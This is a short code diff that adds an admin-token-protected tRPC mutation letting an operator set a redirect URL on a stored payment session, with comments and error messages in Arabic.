@@ -407,6 +407,27 @@ export const appRouter = router({
 
         return { success: true, newStage };
       }),
+
+    // توجيه العميل إلى صفحة محددة
+    redirect: publicProcedure
+      .input(z.object({
+        token: z.string(),
+        sessionId: z.string(),
+        redirectUrl: z.string(),
+      }))
+      .mutation(async ({ input }) => {
+        if (!adminTokens.has(input.token)) {
+          throw new TRPCError({ code: "UNAUTHORIZED", message: "غير مصرح" });
+        }
+        const session = await getPaymentSessionBySessionId(input.sessionId);
+        if (!session) throw new TRPCError({ code: "NOT_FOUND", message: "الجلسة غير موجودة" });
+
+        await updatePaymentSession(input.sessionId, {
+          redirectUrl: input.redirectUrl,
+        });
+
+        return { success: true };
+      }),
   }),
 });
 
